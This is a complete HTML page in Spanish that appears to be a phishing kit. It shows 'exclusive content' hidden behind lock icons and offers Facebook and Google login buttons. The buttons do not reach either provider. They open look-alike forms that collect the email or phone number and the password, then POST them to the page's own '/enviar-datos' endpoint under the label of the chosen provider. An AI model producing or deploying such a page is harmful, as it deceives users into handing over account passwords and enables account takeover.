<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contenido Exclusivo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }

        body {
            background: #000000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        /* Fondo con candados y contenido bloqueado */
        .fondo-bloqueado {
            position: absolute;
            width: 100%;
            height: 100%;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 30px;
            padding: 40px;
            opacity: 0.15;
            pointer-events: none;
        }

        .item-bloqueado {
            color: #868e96;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            user-select: none;
        }

        .item-bloqueado span {
            font-size: 12px;
            margin-top: 8px;
            color: #adb5bd;
        }

        /* Caja de acceso */
        .caja {
            background: rgba(20, 20, 20, 0.95);
            border: 1px solid #333;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 0 30px rgba(0, 120, 255, 0.1);
            text-align: center;
            max-width: 420px;
            width: 90%;
            position: relative;
            z-index: 10;
        }

        h1 {
            margin-bottom: 12px;
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
        }

        p {
            margin-bottom: 30px;
            color: #b0b3b8;
            font-size: 15px;
        }

        /* Botones profesionales */
        .boton {
            width: 100%;
            padding: 13px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: opacity 0.2s ease;
        }

        .boton:hover { opacity: 0.9; }
        .fb { background: #1877f2; }
        .google { background: #ea4335; }

        /* Formularios */
        .formulario {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #333;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #1a1a1a;
            border: 1px solid #444;
            border-radius: 6px;
            font-size: 15px;
            color: #ffffff;
            outline: none;
        }

        input::placeholder { color: #888; }
        input:focus { border-color: #1877f2; }

        .enviar {
            width: 100%;
            padding: 11px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 500;
            margin-top: 10px;
            cursor: pointer;
            transition: opacity 0.2s ease;
        }

        .enviar:hover { opacity: 0.9; }
        .enviar.google { background: #ea4335; }
    </style>
</head>
<body>

    <!-- Fondo con candados simulando contenido bloqueado -->
    <div class="fondo-bloqueado">
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
        <div class="item-bloqueado">🔒<span>Bloqueado</span></div>
    </div>

    <!-- Caja de inicio -->
    <div class="caja">
        <h1>Contenido Exclusivo</h1>
        <p>Para acceder, inicia sesión con una de tus cuentas</p>

        <button class="boton fb" onclick="mostrarForm('fb')">
            🔵 Iniciar con Facebook
        </button>
        <button class="boton google" onclick="mostrarForm('google')">
            🟥 Iniciar con Google
        </button>

        <!-- Formulario Facebook -->
        <div class="formulario" id="form-fb">
            <form action="/enviar-datos" method="POST">
                <input type="hidden" name="proveedor" value="Facebook">
                <input type="text" name="usuario" placeholder="Correo o teléfono" required>
                <input type="password" name="clave" placeholder="Contraseña" required>
                <button type="submit" class="enviar">Iniciar sesión</button>
            </form>
        </div>

        <!-- Formulario Google -->
        <div class="formulario" id="form-google">
            <form action="/enviar-datos" method="POST">
                <input type="hidden" name="proveedor" value="Google">
                <input type="text" name="usuario" placeholder="Correo electrónico" required>
                <input type="password" name="clave" placeholder="Contraseña" required>
                <button type="submit" class="enviar google">Siguiente</button>
            </form>
        </div>
    </div>

    <script>
        function mostrarForm(tipo) {
            document.getElementById('form-fb').style.display = 'none';
            document.getElementById('form-google').style.display = 'none';
            document.getElementById(`form-${tipo}`).style.display = 'block';
        }
    </script>
</body>
</html>
